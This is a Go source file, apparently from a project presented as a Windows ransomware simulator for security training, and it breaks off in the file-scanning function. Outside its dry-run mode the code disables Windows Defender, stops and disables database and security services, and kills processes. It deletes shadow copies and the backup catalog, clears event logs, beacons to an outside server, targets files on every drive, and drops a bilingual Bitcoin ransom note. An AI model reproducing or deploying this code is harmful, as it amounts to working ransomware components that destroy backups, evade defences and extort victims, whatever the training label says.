// ransom_simulator_windows.go - Windows专用版本（增强版）带日志功能 - API优先获取密钥，失败回退本地密钥
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	version   = "v3.1-Windows"
	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
)

const ransomNoteContent = `
================================================================================
   !!! ATTENTION: YOUR FILES ARE ENCRYPTED / 注意：您的文件已被加密 !!!
================================================================================

[ WARNING: Read the following carefully, or you may lose your data permanently ]
[ 警告：请仔细阅读以下内容，否则您可能永久丢失数据 ]

--------------------------------------------------------------------------------
ENGLISH version
--------------------------------------------------------------------------------

Q: What happened?
A: Your computers and servers have been locked by our security software. All your important files (including documents, photos, databases, SQL, backups, etc.) have been encrypted with strong algorithms. It is technically impossible to decrypt them without the private key held by us.

Attempts to modify or rename encrypted files may result in permanent data corruption.

Q: How to restore my files?
A: The only way to restore files is to purchase the decryption tool and private key from us.

1. Download and install Tor Browser (https://www.torproject.org/).
2. Visit our recovery page: [onion_address_placeholder]
3. Enter your unique Personal ID: %s

Payment Terms:
You must pay the ransom in Bitcoin. The price depends on how quickly you contact us.
- If you contact us within 72 hours, the price is: $X,XXX USD (BTC equivalent).
- If over 72 hours, the price will double.
- If we do not receive payment within 7 days, your decryption key will be deleted, and data will be lost permanently.

Free Decryption Test:
To prove that we can recover your files, you can send us 2 small non-important files (less than 1MB), and we will decrypt them for free.

Do not attempt to decrypt it yourself or use third-party software; this will cause permanent data loss.

--------------------------------------------------------------------------------
中文版本 (Chinese Version)
--------------------------------------------------------------------------------

问：发生了什么？
答：您的计算机和服务器已被我们的安全软件锁定。您所有的重要文件（包括文档、照片、数据库、SQL、备份等）都已被高强度算法加密。如果不使用我们持有的私钥，这在技术上是无法解密的。

试图修改或重命名加密文件可能会导致数据永久损坏。

问：如何恢复我的文件？
答：恢复文件的唯一方法是从我们这里购买解密工具和私钥。

1. 下载并安装 Tor 浏览器 (https://www.torproject.org/).
2. 访问我们的恢复页面: [此处为模拟的 .onion 地址]
3. 输入您的唯一个人ID: %s

付款条款：
您必须以比特币（Bitcoin）支付赎金。
价格取决于您与其联系的速度。
- 如果在 72 小时内联系我们，价格为：$X,XXX USD (BTC 等值)
- 如果超过 72 小时，价格将翻倍。
- 如果我们在 7 天内没有收到付款，您的解密密钥将被删除，数据将永久丢失。

免费解密测试：
为了证明我们可以恢复您的文件，您可以发送 2 个非重要的小文件（小于 1MB）给我们，我们将免费为您解密。

切勿尝试自行解密或使用第三方软件，这会导致数据永久丢失。

[攻击者组织名称/签名]

====================== [ 这是一次用于安全培训的模拟 ] ======================

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络已经被完全攻陷。
本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥及解密程序：
https://encrypt.yangzifun.org/
获取私钥ID是: %s

项目链接：https://github.com/yangzifun/ransom_simulator
免责声明与许可
本项目遵循 MIT 许可证请查阅 LICENSE 文件了解详情。
再次强调，此工具的创建旨在赋能**防御者**，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。

`

var (
	lockFilePath       string
	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"

	// 日志相关变量
	logEnabled        bool
	logDirectory      string
	successLogFile    *os.File
	failedLogFile     *os.File
	operationsLogFile *os.File

	// 公钥缓存，避免重复解析
	publicKeyCache     *rsa.PublicKey
	publicKeyCacheStr  string
	publicKeyCacheLock sync.RWMutex

	// 程序所在目录
	programDir string

	// 公钥变量
	publicKeyPEM string

	// 目标进程列表
	targetProcessesWindows = []string{
		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
		"thunderbird.exe", "steam.exe", "code.exe", "powershell.exe", "cmd.exe",
		// 数据库相关进程
		"sqlwriter.exe", "sqlbrowser.exe", "mysql.exe", "pg_ctl.exe", "mongod.exe",
		"redis-server.exe", "oracle.exe", "sqlplus.exe",
		// 安全软件进程
		"mcshield.exe", "avp.exe", "bdagent.exe", "SophosUI.exe", "SEP.exe",
		"avastui.exe", "avgui.exe", "kav.exe", "kis.exe",
		// 备份软件进程
		"vssvc.exe", "wbengine.exe", "ntbackup.exe", "backupexec.exe",
	}

	// Windows数据库和安全服务
	windowsDatabaseServices = []string{
		"MSSQLSERVER", "SQLSERVERAGENT", "SQLWriter", "SQLBrowser",
		"MySQL80", "MySQL57", "PostgreSQL", "MongoDB",
		"Redis", "OracleServiceXE", "OracleServiceORCL",
	}

	windowsSecurityServices = []string{
		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
		"McAfeeFramework", "McShield", "SophosAgent", "SophosAlertService",
		"SEPMasterService", "SEPScanner", "SEPMonitoring", "AvastSvc",
		"AVGSvc", "Kaspersky Anti-Virus Service", "Kaspersky Security Center",
	}

	// 排除目录
	excludedDirsWindows = []string{
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
		"System Volume Information", "$Recycle.Bin", "C:\\ProgramData",
		"C:\\System32", "C:\\SysWOW64", "C:\\Windows.old",
	}

	// 目标扩展名（增强版）
	targetExtensions = []string{
		// 文档文件
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub", ".one",
		// 压缩文件
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
		// 图片文件
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
		".svg", ".webp", ".ico", ".psd", ".ai", ".eps",
		// 数据库文件
		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
		".wal", ".journal", ".rdb", ".aof", ".dump", ".backup",
		// 配置文件
		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
		".properties", ".env", ".toml", ".config",
		// 备份文件
		".bak", ".backup", ".old", ".temp", ".tmp", ".swp", ".~*",
		// 代码文件
		".go", ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
		".php", ".rb", ".pl", ".sh", ".bash", ".ps1", ".bat",
		// 虚拟化和容器文件
		".vmdk", ".vhd", ".vhdx", ".qcow2", ".ova", ".ovf",
		".dockerfile", ".dockerignore", ".vbox",
		// 其他重要文件
		".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
		".pcap", ".log", ".tar.gz", ".tar.bz2",
	}

	// Windows数据库数据目录
	windowsDatabaseDataDirs = []string{
		"C:\\ProgramData\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files (x86)\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files\\PostgreSQL\\data",
		"C:\\Program Files (x86)\\PostgreSQL\\data",
		"C:\\Program Files\\Microsoft SQL Server\\MSSQL\\DATA",
		"C:\\Program Files (x86)\\Microsoft SQL Server\\MSSQL\\DATA",
		"C:\\MongoDB\\data",
		"D:\\MongoDB\\data",
		"C:\\Redis\\data",
		"C:\\Oracle\\oradata",
		"D:\\Oracle\\oradata",
	}
)

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

func main() {
	forceReleaseLock()

	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - Windows增强版（API优先+本地回退）")
	fmt.Printf("                版本: %s\n", version)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	// 获取程序所在目录
	initProgramDir()

	fmt.Println("\n[阶段 1: 渗透与持久化]")
	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag := setupFlags(fs)
	if err := fs.Parse(os.Args[1:]); err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
		os.Exit(1)
	}

	// 初始化日志系统
	initLogging(*logFlag)
	defer closeLogFiles()

	showWarning(*dryRunFlag)
	fmt.Println("\n[阶段 2: 防御规避与发现]")
	if *dryRunFlag {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else {
		go networkBeacon()

		// 新增功能：停止Windows服务
		fmt.Println("\n[+] 停止数据库和安全服务...")
		stopWindowsServices()

		// 新增功能：清理数据库内存和缓存
		fmt.Println("\n[+] 清理数据库内存和缓存...")
		cleanWindowsDatabaseMemory()

		killLockingProcesses()
		simulateDestructiveActions()
	}

	extFilter := make(map[string]bool)
	if *extensionsFlag != "" {
		exts := strings.Split(*extensionsFlag, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用增强扩展名列表 (包含数据库文件、配置文件、备份文件等)")
	}

	var scanRoots []string
	encryptAllFormats := false
	if *directoryFlag != "" {
		dirs := strings.Split(*directoryFlag, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
		if len(scanRoots) > 0 {
			encryptAllFormats = true
			fmt.Println("[*] 目录定位模式已激活: 将加密指定目录下的【所有格式】文件")
		}
	}

	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
	filesToProcess := scanFiles(extFilter, scanRoots, encryptAllFormats)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
		os.Exit(0)
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))

	var stats counters
	var finalUUID = "本地密钥模式"
	if *dryRunFlag {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !*dryRunFlag {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID, finalUUID, finalUUID)
		userProfile, err := os.UserHomeDir()
		if err == nil {
			desktopPath := filepath.Join(userProfile, "Desktop")
			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
		}
		createRansomWallpaper()
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	if *dryRunFlag {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
	}

	// 输出日志文件位置
	if logEnabled {
		fmt.Println("\n================== [ 日志文件 ] ==================")
		fmt.Printf("  - 成功日志:        %s\n", filepath.Join(logDirectory, "success_encrypted.log"))
		fmt.Printf("  - 失败日志:        %s\n", filepath.Join(logDirectory, "failed_encrypted.log"))
		fmt.Printf("  - 操作日志:        %s\n", filepath.Join(logDirectory, "operations.log"))
		fmt.Println("====================================================")
	}

	countdown("此终端将在", 10)
}

// 初始化程序所在目录
func initProgramDir() {
	exePath, err := os.Executable()
	if err != nil {
		// 如果无法获取可执行文件路径，则使用当前工作目录
		programDir, _ = os.Getwd()
		fmt.Printf("[!] 警告: 无法获取程序路径，使用当前工作目录: %s\n", programDir)
	} else {
		programDir = filepath.Dir(exePath)
		fmt.Printf("[*] 程序所在目录: %s\n", programDir)
	}
}

// 从公钥文件名中提取UUID
func extractUUIDFromFilename() (string, error) {
	// 扫描程序目录中的文件，查找公钥文件
	files, err := os.ReadDir(programDir)
	if err != nil {
		return "", fmt.Errorf("无法读取程序目录: %w", err)
	}

	// 正则表达式匹配公钥文件名格式
	pattern := regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		matches := pattern.FindStringSubmatch(file.Name())
		if matches != nil && len(matches) == 2 {
			uuid := matches[1]
			if isValidUUID(uuid) {
				fmt.Printf("[*] 从文件名提取UUID: %s\n", uuid)
				return uuid, nil
			}
		}
	}

	return "", fmt.Errorf("未找到有效的公钥文件。请确保程序目录中存在公钥文件，格式为: public_key_<uuid>.pem")
}

// 验证UUID格式
func isValidUUID(uuid string) bool {
	if len(uuid) != 36 {
		return false
	}

	// 检查格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
	parts := strings.Split(uuid, "-")
	if len(parts) != 5 {
		return false
	}

	lengths := []int{8, 4, 4, 4, 12}
	for i, part := range parts {
		if len(part) != lengths[i] {
			return false
		}
		// 检查是否为十六进制字符
		for _, ch := range part {
			if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
				return false
			}
		}
	}

	return true
}

// 从本地PEM文件读取公钥
func readPublicKeyFromFile(uuid string) (string, error) {
	// 构造文件名
	fileName := fmt.Sprintf("public_key_%s.pem", uuid)
	filePath := filepath.Join(programDir, fileName)

	// 检查文件是否存在
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return "", fmt.Errorf("公钥文件不存在: %s", filePath)
	}

	// 读取文件内容
	content, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("读取公钥文件失败: %w", err)
	}

	// 验证PEM格式
	pemBlock, _ := pem.Decode(content)
	if pemBlock == nil {
		return "", fmt.Errorf("无效的PEM格式: %s", filePath)
	}

	// 验证公钥类型
	if pemBlock.Type != "PUBLIC KEY" && pemBlock.Type != "RSA PUBLIC KEY" {
		return "", fmt.Errorf("不是有效的公钥文件: 类型应为 'PUBLIC KEY' 或 'RSA PUBLIC KEY'，实际为 '%s'", pemBlock.Type)
	}

	// 尝试解析以验证有效性
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		// 尝试PKCS1格式
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return "", fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	_, ok := pub.(*rsa.PublicKey)
	if !ok {
		return "", fmt.Errorf("公钥不是RSA类型")
	}

	if logEnabled {
		logOperation(fmt.Sprintf("从本地文件读取公钥: %s", filePath))
	}

	return string(content), nil
}

// 初始化日志系统
func initLogging(enableLog bool) {
	logEnabled = enableLog
	if !logEnabled {
		return
	}

	// 使用程序所在目录作为日志目录
	logDirectory = programDir

	fmt.Printf("[*] 日志系统已启用，日志将输出到: %s\n", logDirectory)

	// 创建日志文件
	var err1, err2, err3 error
	successLogFile, err1 = os.OpenFile(
		filepath.Join(logDirectory, "success_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	failedLogFile, err2 = os.OpenFile(
		filepath.Join(logDirectory, "failed_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	operationsLogFile, err3 = os.OpenFile(
		filepath.Join(logDirectory, "operations.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	if err1 != nil || err2 != nil || err3 != nil {
		fmt.Printf("[!] 无法创建日志文件: success=%v, failed=%v, operations=%v\n", err1, err2, err3)
		logEnabled = false
	} else {
		// 写入日志文件头
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		header := fmt.Sprintf("=================== 勒索软件模拟器日志 ===================\n")
		header += fmt.Sprintf("程序版本: %s\n", version)
		header += fmt.Sprintf("开始时间: %s\n", timestamp)
		header += fmt.Sprintf("运行参数: %s\n", strings.Join(os.Args, " "))
		header += fmt.Sprintf("工作目录: %s\n", programDir)
		header += fmt.Sprintf("=========================================================\n\n")

		_, _ = successLogFile.WriteString(header)
		_, _ = failedLogFile.WriteString(header)
		_, _ = operationsLogFile.WriteString(header)
	}
}

// 关闭日志文件
func closeLogFiles() {
	if logEnabled {
		if successLogFile != nil {
			_ = successLogFile.Close()
		}
		if failedLogFile != nil {
			_ = failedLogFile.Close()
		}
		if operationsLogFile != nil {
			_ = operationsLogFile.Close()
		}
	}
}

// 记录成功加密的文件
func logSuccess(filePath string) {
	if !logEnabled || successLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] SUCCESS: %s -> %s.encrypted\n",
		timestamp, filePath, filePath)

	successLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("成功加密: %s", filePath))
}

// 记录加密失败的文件
func logFailed(filePath string, errorMsg string) {
	if !logEnabled || failedLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] FAILED: %s - %s\n",
		timestamp, filePath, errorMsg)

	failedLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("加密失败: %s - %s", filePath, errorMsg))
}

// 记录操作日志
func logOperation(message string) {
	if !logEnabled || operationsLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)

	operationsLogFile.WriteString(logEntry)
}

// 获取或解析公钥（带缓存）
func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
	publicKeyCacheLock.RLock()
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		publicKeyCacheLock.RUnlock()
		return publicKeyCache, nil
	}
	publicKeyCacheLock.RUnlock()

	// 解析公钥
	publicKeyCacheLock.Lock()
	defer publicKeyCacheLock.Unlock()

	// 再次检查，防止并发重复解析
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		return publicKeyCache, nil
	}

	// 清理公钥字符串，确保格式正确
	cleanedKeyStr := strings.TrimSpace(publicKeyStr)

	// 检查PEM格式
	if !strings.HasPrefix(cleanedKeyStr, "-----BEGIN") {
		// 尝试添加PEM头
		cleanedKeyStr = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----", cleanedKeyStr)
	}

	// 解码PEM
	pemBlock, _ := pem.Decode([]byte(cleanedKeyStr))
	if pemBlock == nil {
		// 尝试不同的PEM格式
		if strings.Contains(cleanedKeyStr, "RSA PUBLIC KEY") {
			cleanedKeyStr = strings.Replace(cleanedKeyStr, "RSA PUBLIC KEY", "PUBLIC KEY", 1)
			pemBlock, _ = pem.Decode([]byte(cleanedKeyStr))
		}

		if pemBlock == nil {
			return nil, fmt.Errorf("解码PEM公钥失败: 无效的PEM格式")
		}
	}

	// 解析公钥
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		// 尝试解析PKCS1格式
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return nil, fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥不是RSA类型")
	}

	// 更新缓存
	publicKeyCache = rsaPubKey
	publicKeyCacheStr = publicKeyStr

	return rsaPubKey, nil
}

// 新增功能：停止Windows服务
func stopWindowsServices() {
	if logEnabled {
		logOperation("开始停止Windows服务")
	}

	// 停止数据库服务
	for _, service := range windowsDatabaseServices {
		fmt.Printf("  - 停止数据库服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service))
		}

		// 使用sc命令停止服务
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()

		// 使用net命令停止服务
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()

		// 禁用服务
		cmd = exec.Command("sc", "config", service, "start=", "disabled")
		_ = cmd.Run()

		time.Sleep(100 * time.Millisecond)
	}

	// 停止安全服务
	for _, service := range windowsSecurityServices {
		fmt.Printf("  - 停止安全服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止安全服务: %s", service))
		}

		// 使用sc命令停止服务
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()

		// 使用net命令停止服务
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()

		// 尝试杀死相关进程
		serviceExe := strings.ToLower(service)
		cmd = exec.Command("taskkill", "/F", "/IM", serviceExe+".exe")
		_ = cmd.Run()

		time.Sleep(100 * time.Millisecond)
	}

	// 停止Windows Defender
	fmt.Println("  - 停止Windows Defender...")
	if logEnabled {
		logOperation("尝试停止Windows Defender")
	}

	// 停止实时保护
	cmd := exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
	_ = cmd.Run()

	// 停止扫描服务
	cmd = exec.Command("powershell", "-Command", "Set-MpPreference -DisableScanning $true")
	_ = cmd.Run()

	if logEnabled {
		logOperation("Windows服务停止完成")
	}
}

// 新增功能：清理Windows数据库内存
func cleanWindowsDatabaseMemory() {
	if logEnabled {
		logOperation("开始清理Windows数据库内存和缓存")
	}

	fmt.Println("  - 清理SQL Server缓存...")

	if logEnabled {
		logOperation("清理SQL Server缓存")
	}

	// 清理SQL Server缓存
	cleanSQLServerCache()

	fmt.Println("  - 清理系统内存...")

	if logEnabled {
		logOperation("清理系统内存")
	}

	// 清理系统内存
	cmd := exec.Command("powershell", "-Command", "Clear-EventLog -LogName Application, System, Security")
	_ = cmd.Run()

	// 清理DNS缓存
	cmd = exec.Command("ipconfig", "/flushdns")
	_ = cmd.Run()

	if logEnabled {
		logOperation("Windows数据库内存和缓存清理完成")
	}
}

func cleanSQLServerCache() {
	// 尝试使用SQLCMD清理缓存
	cleanCommands := []string{
		"DBCC DROPCLEANBUFFERS",
		"DBCC FREEPROCCACHE",
		"DBCC FREESYSTEMCACHE ('ALL')",
		"DBCC FREESESSIONCACHE",
	}

	for _, sqlCmd := range cleanCommands {
		cmd := exec.Command("sqlcmd", "-Q", sqlCmd)
		_ = cmd.Run()
	}
}

func killLockingProcesses() {
	fmt.Println("\n[+] 终止占用文件的进程...")

	if logEnabled {
		logOperation("开始终止占用文件的进程")
	}

	for _, proc := range targetProcessesWindows {
		fmt.Printf("  - 终止进程: %s\n", proc)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试终止进程: %s", proc))
		}

		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
	}
	time.Sleep(1 * time.Second)

	if logEnabled {
		logOperation("进程终止完成")
	}
}

func forceReleaseLock() {
	lockPath := filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	_ = os.Remove(lockPath)
}

func createSingleInstanceLock() bool {
	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	file, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
	if err != nil {
		return false
	}
	_ = file.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		_ = os.Remove(lockFilePath)
	}
}

func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool) {
	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
	dryRun := fs.Bool("dry-run", false, "演习模式")
	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")

	fs.Usage = func() {
		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
		_, _ = fmt.Fprintf(os.Stderr, "密钥获取优先级: 1) API接口获取 2) 本地公钥文件\n")
		_, _ = fmt.Fprintf(os.Stderr, "本地公钥文件格式:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - public_key_<uuid>.pem: 公钥文件，例如 public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem\n")
		_, _ = fmt.Fprintf(os.Stderr, "注意: 当API不可用时，UUID将从公钥文件名中自动提取\n")
		_, _ = fmt.Fprintf(os.Stderr, "日志文件将输出到程序所在目录:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
		fs.PrintDefaults()
	}
	return workers, dryRun, extensions, directory, removeOriginal, logFlag
}

func showWarning(dryRun bool) {
	_, _ = fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	_, _ = fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密指定范围内的文件。\n")
	_, _ = fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	_, _ = fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

func networkBeacon() {
	time.Sleep(3 * time.Second)
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(beaconURL)
	if err != nil {
		return
	}
	defer func() { _ = resp.Body.Close() }()
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("\n[+] 执行破坏性操作...")
	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies...")

	if logEnabled {
		logOperation("开始执行破坏性操作：清除Shadow Copies")
	}

	// 清除卷影副本
	cmd := exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/all", "/quiet")
	_ = cmd.Run()

	fmt.Println("  - [IOC] 模拟: 清除系统备份...")

	// 清除Windows备份
	cmd = exec.Command("wbadmin", "delete", "catalog", "-quiet")
	_ = cmd.Run()

	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")

	if logEnabled {
		logOperation("清除系统安全日志")
	}

	// 清除Windows事件日志
	cmd = exec.Command("wevtutil", "cl", "Application")
	_ = cmd.Run()

	cmd = exec.Command("wevtutil", "cl", "System")
	_ = cmd.Run()

	cmd = exec.Command("wevtutil", "cl", "Security")
	_ = cmd.Run()

	// 禁用Windows事件日志服务
	cmd = exec.Command("sc", "config", "EventLog", "start=", "disabled")
	_ = cmd.Run()

	cmd = exec.Command("sc", "stop", "EventLog")
	_ = cmd.Run()

	if logEnabled {
		logOperation("破坏性操作完成")
	}

	time.Sleep(1 * time.Second)
}

func createRansomWallpaper() {
	fmt.Println("[*] Windows壁纸修改功能(模拟)")

	if logEnabled {
		logOperation("尝试修改壁纸")
	}

	// 尝试修改Windows壁纸
	wallpaperCommands := []string{
		`reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg" /f`,
		`powershell -Command "Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value 'C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg'"`,
	}

	for _, cmdStr := range wallpaperCommands {
		cmd := exec.Command("cmd", "/C", cmdStr)
		_ = cmd.Run()
	}
}

func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
	var filesToProcess []string
	var roots []string
	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				roots = append(roots, drivePath)
			}
		}
	}

	// 添加Windows数据库数据目录到扫描范围
	for _, dbDir := range windowsDatabaseDataDirs {
		if _, err := os.Stat(dbDir); err == nil {
			roots = append(roots, dbDir)
		}
	}

	fmt.Printf("[*] 扫描根目录: %v\n", roots)

	if logEnabled {
		logOperation(fmt.Sprintf("开始扫描文件，根目录: %v", roots))
		logOperation(fmt.Sprintf("加密所有格式: %v", encryptAllFormats))
	}

	for _, root := range roots {
